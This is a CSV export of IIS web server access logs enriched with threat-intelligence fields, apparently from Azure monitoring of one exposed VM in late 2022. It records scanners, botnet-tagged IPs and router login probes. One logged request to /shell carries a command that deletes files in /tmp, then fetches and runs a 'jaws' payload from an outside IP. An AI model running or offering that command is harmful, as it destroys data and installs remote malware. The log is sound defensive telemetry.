TenantId,SourceSystem,FileUri,FileOffset,StorageAccount,AzureDeploymentID,Role,RoleInstance,Date,Time,"TimeGenerated [UTC]",sSiteName,sComputerName,sIP,csMethod,csUriStem,csUriQuery,sPort,csUserName,cIP,csVersion,csUserAgent,csCookie,csReferer,csHost,scStatus,scSubStatus,scWin32Status,scBytes,csBytes,TimeTaken,Computer,MG,ManagementGroupName,MaliciousIP,IndicatorThreatType,Description,TLPLevel,Confidence,Severity,FirstReportedDateTime,LastReportedDateTime,IsActive,ReportReferenceLink,AdditionalInformation,RemoteIPLongitude,RemoteIPLatitude,RemoteIPCountry,Type,"_ResourceId"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112815.log",130,,,,,"2022-11-28","15:25:15","11/28/2022, 3:25:15.000 PM","Default Web Site",,"10.3.0.4",GET,"/admin/sysadmin/index.php","lang=en",80,"-","8.141.166.13",,"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36",,"-",,404,0,2,,,283,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"119.84","29.97","People's Republic of China",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112815.log",131,,,,,"2022-11-28","15:39:53","11/28/2022, 3:39:53.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","141.255.166.2",,"Hello+World",,"-",,200,0,0,,,23,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","141.255.166.2",Botnet,,,75,2,"2022-11-28T12:43:43.8788888Z","2022-11-28T08:27:34.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"8.54","47.37",Switzerland,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112817.log",5,,,,,"2022-11-28","17:03:15","11/28/2022, 5:03:15.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","161.35.19.241",,"Mozilla/5.0+zgrab/0.x",,"-",,200,0,0,,,271,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-71.44","42.59","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112818.log",5,,,,,"2022-11-28","18:00:14","11/28/2022, 6:00:14.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","128.14.141.34",,"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.113+Safari/537.36",,"-",,200,0,0,,,616,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-117.82","33.99","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112818.log",10,,,,,"2022-11-28","18:35:23","11/28/2022, 6:35:23.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","205.210.31.23",,"Expanse,+a+Palo+Alto+Networks+company,+searches+across+the+global+IPv4+space+multiple+times+per+day+to+identify+customers&#39;+presences+on+the+Internet.+If+you+would+like+to+be+excluded+from+our+scans,+please+send+IP+addresses/domains+to:+scaninfo@paloaltonetworks.com",,"-",,200,0,0,,,249,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-121.96","37.4","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112818.log",11,,,,,"2022-11-28","18:41:10","11/28/2022, 6:41:10.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","141.255.166.2",,"Hello+World",,"-",,200,0,0,,,22,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"8.54","47.37",Switzerland,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112818.log",12,,,,,"2022-11-28","18:46:13","11/28/2022, 6:46:13.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","62.233.50.163",,"masscan/1.3+(https://github.com/robertdavidgraham/masscan)",,"-",,200,0,1236,,,13157,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"37.6","55.76",Russia,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112818.log",13,,,,,"2022-11-28","18:49:41","11/28/2022, 6:49:41.000 PM","Default Web Site",,"10.3.0.4",POST,"/boaform/admin/formLogin","-",80,"-","194.55.186.216",,"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:71.0)+Gecko/20100101+Firefox/71.0",,"http://20.71.178.48:80/admin/login.asp",,404,0,2,,,8,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","194.55.186.216",Botnet,,,75,2,"2022-11-28T15:22:34.5815864Z","2022-11-28T04:08:34.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"4.16","51.9",Netherlands,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22112818.log",14,,,,,"2022-11-28","18:57:09","11/28/2022, 6:57:09.000 PM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","94.102.61.10",,"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/88.0.4324.190+Safari/537.36",,"-",,200,0,0,,,4,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"4.94","52.31",Netherlands,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",5,,,,,"2022-11-30","09:02:27","11/30/2022, 9:02:27.000 AM","Default Web Site",,"10.3.0.4",POST,"/boaform/admin/formLogin","-",80,"-","194.55.186.216",,"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:71.0)+Gecko/20100101+Firefox/71.0",,"http://20.71.178.48:80/admin/login.asp",,404,0,2,,,1497,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","194.55.186.216",Botnet,,,75,2,"2022-11-30T05:41:20.6359871Z","2022-11-29T06:21:55.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"4.16","51.9",Netherlands,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",6,,,,,"2022-11-30","09:05:39","11/30/2022, 9:05:39.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","185.246.221.101",,"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0",,"-",,200,0,0,,,54,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","185.246.221.101",Botnet,,,75,2,"2022-11-30T07:07:49.9891163Z","2022-11-29T15:00:30.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"23.32","42.7",Bulgaria,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",7,,,,,"2022-11-30","09:11:57","11/30/2022, 9:11:57.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","64.62.197.231",,"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/103.0.0.0+Safari/537.36",,"-",,200,0,0,,,149,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-121.98","37.57","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",8,,,,,"2022-11-30","09:15:36","11/30/2022, 9:15:36.000 AM","Default Web Site",,"10.3.0.4",GET,"/favicon.ico","-",80,"-","64.62.197.235",,"Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/15.5+Safari/605.1.15",,"-",,404,0,2,,,148,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-121.98","37.57","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",9,,,,,"2022-11-30","09:24:03","11/30/2022, 9:24:03.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","141.255.166.2",,"Hello+World",,"-",,200,0,0,,,22,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","141.255.166.2",Botnet,,,75,2,"2022-11-30T07:07:41.2659587Z","2022-11-29T22:24:50.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"8.54","47.37",Switzerland,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",14,,,,,"2022-11-30","09:47:57","11/30/2022, 9:47:57.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","141.255.166.2",,"Hello+World",,"-",,200,0,0,,,287,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","141.255.166.2",Botnet,,,75,2,"2022-11-30T07:07:41.2659587Z","2022-11-29T22:24:50.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"8.54","47.37",Switzerland,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",15,,,,,"2022-11-30","09:53:12","11/30/2022, 9:53:12.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","66.240.192.82",,"'Mozilla/5.0+project_patchwatch'",,"-",,200,0,0,,,144,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-115.04","36.01","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",16,,,,,"2022-11-30","09:53:46","11/30/2022, 9:53:46.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","167.94.138.45",,"-",,"-",,200,0,0,,,109,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-83.71","42.27","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",17,,,,,"2022-11-30","09:53:46","11/30/2022, 9:53:46.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","167.94.138.45",,"Mozilla/5.0+(compatible;+CensysInspect/1.1;++https://about.censys.io/)",,"-",,200,0,0,,,110,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-83.71","42.27","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",18,,,,,"2022-11-30","09:53:46","11/30/2022, 9:53:46.000 AM","Default Web Site",,"10.3.0.4",GET,"/favicon.ico","-",80,"-","167.94.138.45",,"Mozilla/5.0+(compatible;+CensysInspect/1.1;++https://about.censys.io/)",,"-",,404,0,2,,,111,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-83.71","42.27","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22113009.log",19,,,,,"2022-11-30","09:55:16","11/30/2022, 9:55:16.000 AM","Default Web Site",,"10.3.0.4",GET,"/shell","cd+/tmp;rm+-rf+*;wget+91.122.37.169/jaws;sh+/tmp/jaws",80,"-","213.184.105.60",,"Hello,+world",,"-",,404,0,64,,,136,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"4.41","51.92",Netherlands,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22121209.log",5,,,,,"2022-12-12","09:05:26","12/12/2022, 9:05:26.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","104.152.52.127",,"masscan/1.3+(https://github.com/robertdavidgraham/masscan)",,"-",,200,0,1236,,,13183,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-87.61","41.9","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22121210.log",5,,,,,"2022-12-12","10:23:59","12/12/2022, 10:23:59.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","92.118.39.29",,"-",,"-",,200,0,0,,,324,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","92.118.39.29",Botnet,,,75,2,"2022-12-12T08:24:55.7432166Z","2022-12-11T16:22:00.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"5.45","52.3",Netherlands,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22121210.log",10,,,,,"2022-12-12","10:52:47","12/12/2022, 10:52:47.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","128.14.133.58",,"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.113+Safari/537.36",,"-",,200,0,0,,,281,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-117.82","33.99","United States",W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22121211.log",5,,,,,"2022-12-12","11:17:39","12/12/2022, 11:17:39.000 AM","Default Web Site",,"10.3.0.4",POST,"/boaform/admin/formLogin","-",80,"-","84.21.172.128",,"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:71.0)+Gecko/20100101+Firefox/71.0",,"http://20.71.178.48:80/admin/login.asp",,404,0,2,,,188,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8","84.21.172.128",Botnet,,,75,2,"2022-12-12T09:39:41.4305910Z","2022-12-12T06:23:31.0000000Z",True,"https://interflowinternal.azure-api.net/reporting/api/report/tagquery?tags=webbot+Conficker&languageCode={languageCode}&tenantId={tenantId}",,"28.96","41.01",Turkey,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
"08d88ad8-ad84-48d8-aa3d-e47975593fe8",OpsMgr,"/iislogblob/v0/tenant=08d88ad8-ad84-48d8-aa3d-e47975593fe8/00000000-0000-0000-0000-000000000001/AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8/d1e679d3-2da9-ce8c-8d5f-6b2c80fd1931/W3SVC1/u_ex22121211.log",6,,,,,"2022-12-12","11:30:10","12/12/2022, 11:30:10.000 AM","Default Web Site",,"10.3.0.4",GET,"/","-",80,"-","142.93.147.2",,"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/108.0.0.0+Safari/537.36",,"-",,200,0,0,,,147,"sysmon-parser","00000000-0000-0000-0000-000000000001","AOI-08d88ad8-ad84-48d8-aa3d-e47975593fe8",,,,,,,,,,,,"-79.51","43.7",Canada,W3CIISLog,"/subscriptions/80f5d637-5241-4d16-8e51-8d1b8a3cbc4d/resourcegroups/sysmon-parser/providers/microsoft.compute/virtualmachines/sysmon-parser"
